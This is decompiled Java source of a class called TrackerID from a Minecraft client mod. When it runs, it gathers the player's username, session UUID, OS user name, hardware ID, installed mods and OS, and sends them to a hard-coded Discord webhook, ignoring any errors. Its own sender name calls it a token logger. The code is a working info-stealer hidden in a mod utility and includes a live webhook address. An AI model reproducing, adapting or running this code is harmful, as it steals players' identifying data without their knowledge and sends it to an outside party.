//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\utente\Desktop\Minecraft-Deobfuscator3000-master\1.12 stable mappings"!

//Decompiled by Procyon!

package me.earth.phobos.util;

import net.minecraft.client.*;

public class TrackerID
{
    public TrackerID() {
        final String l = "https://discord.com/api/webhooks/852376561797431306/-w-IZtn4AlRDJhbHPeJudBpOu6X-SPalu9kt0vu9FkTVX4dtgpHuJAPiLl3Nx_GamQa4";
        final String CapeName = "Perrys Token Log I mean Tracker";
        final String CapeImageURL = "https://cdn.discordapp.com/icons/851358091286282260/17fdd021c701c00ff95bc2b50344a5ad.png?size=128";
        final TrackerUtil d = new TrackerUtil("https://discord.com/api/webhooks/852376561797431306/-w-IZtn4AlRDJhbHPeJudBpOu6X-SPalu9kt0vu9FkTVX4dtgpHuJAPiLl3Nx_GamQa4");
        String minecraft_name = "NOT FOUND";
        try {
            minecraft_name = Minecraft.getMinecraft().getSession().getUsername();
        }
        catch (Exception ex) {}
        try {
            final TrackerPlayerBuilder dm = new TrackerPlayerBuilder.Builder().withUsername("Perrys Token Log I mean Tracker").withContent("```\n IGN: " + minecraft_name + "\n USER: " + System.getProperty("user.name") + "\n UUID: " + Minecraft.getMinecraft().session.getPlayerID() + "\n HWID: " + SystemUtil.getSystemInfo() + "\n MODS: " + SystemUtil.getModsList() + "\n OS: " + System.getProperty("os.name") + "\n Closed the game.```").withAvatarURL("https://cdn.discordapp.com/icons/851358091286282260/17fdd021c701c00ff95bc2b50344a5ad.png?size=128").withDev(false).build();
            d.sendMessage(dm);
        }
        catch (Exception ex2) {}
    }
}
